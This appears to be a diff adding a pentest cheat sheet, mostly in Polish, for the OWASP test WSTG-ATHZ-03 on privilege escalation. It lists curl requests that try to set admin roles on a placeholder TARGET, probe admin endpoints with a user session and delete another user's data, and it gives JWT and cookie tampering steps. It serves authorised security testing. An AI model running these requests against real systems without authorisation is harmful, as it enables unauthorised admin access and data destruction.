@@ -1,0 +1,42 @@
+================================================================================
+WSTG-ATHZ-03 — Testing for Privilege Escalation
+================================================================================
+CELE:
+- Identify injection points related to privilege manipulation
+- Fuzz or otherwise attempt to bypass security measures
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Modyfikacja roli w request ---
+curl -X POST "https://TARGET/api/user/profile" -H "Cookie: session=USER_SESSION" -H "Content-Type: application/json" -d '{"role":"admin"}'
+curl -X POST "https://TARGET/api/user/profile" -H "Cookie: session=USER_SESSION" -d "isAdmin=true"
+curl -X POST "https://TARGET/api/user/profile" -H "Cookie: session=USER_SESSION" -d "usertype=1"
+
+# --- Modyfikacja tokenu/cookie ---
+# Sprawdz JWT claims (role, sub, admin)
+# Sprawdz cookie values (base64 decode, modify, re-encode)
+
+# --- Dostep do admin API ---
+curl -s "https://TARGET/api/admin/users" -H "Cookie: session=USER_SESSION" -o /dev/null -w "%{http_code}\n"
+curl -s "https://TARGET/api/admin/settings" -H "Cookie: session=USER_SESSION" -o /dev/null -w "%{http_code}\n"
+
+# --- Parameter tampering ---
+curl -X POST "https://TARGET/api/action" -H "Cookie: session=USER_SESSION" -d "user_id=ADMIN_ID&action=delete"
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- Brak dedykowanych wordlist - test logiczny ---
+# Referencja: /home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/Insecure Direct Object References/README.md
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Zidentyfikuj rozne poziomy uprawnien w aplikacji
+2. Testuj modyfikacje parametrow roli (role, group, type, level)
+3. Sprawdz JWT/cookie pod katem manipulacji uprawnien
+4. Testuj dostep do endpointow wyzszego poziomu
+5. Uzyj Burp Match/Replace do automatycznej podmiany parametrow
